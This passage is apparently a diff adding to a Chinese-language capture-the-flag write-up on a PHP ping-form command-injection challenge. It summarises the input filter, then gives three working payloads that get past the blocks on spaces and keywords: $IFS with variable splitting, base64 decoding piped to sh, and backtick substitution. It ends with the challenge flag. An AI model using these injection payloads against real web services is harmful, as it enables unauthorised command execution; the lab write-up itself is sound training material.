@@ -214,3 +214,39 @@ payload: `?ip=127.0.0.1|cat$IFS$1index.php`
 
 ?>
 ````
+
+让AI分析一遍：
+
+1. 过滤的字符和符号：
+代码使用 `preg_match()` 对 IP 地址进行检查，防止特殊字符或符号（如 `|`, `'`, `"`, \\, `(`, `)`, `[`, `]`, `{`, `}`, `/`, `?`, `*`, `<`, `>`, 空格等）被输入。
+
+2. 阻止空格：
+如果输入包含空格，程序会拒绝执行并输出 "fxck your space!"。
+
+3. 阻止 bash：
+如果输入中包含 "bash"，程序会拒绝并输出 "fxck your bash!"。
+
+4. 阻止 flag：
+如果输入中包含 "flag"，程序会拒绝并输出 "fxck your flag!"。
+
+方法一：
+
+payload:`/?ip=127.0.0.1;s=ag;d=fl;cat$IFS$1$d$s.php`
+
+原理：变量替换，ag写在前面防止检测
+
+方法二：
+
+payload:`/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh`
+
+原理：cat flag.php进行base64编码，用`sh`执行`echo`命令
+
+方法三：
+
+payload:``/?ip=127.0.0.1;cat$IFS$9`ls` ``
+
+原理：先执行`ls`，再把返回的值传入`cat xxx`
+
+需查看源码才能看到flag（一开始还以为靶机有问题，重启了好几次XDD）
+
+`flag{c397edc5-dc1e-45e1-b1d1-2726fca99f2a}`
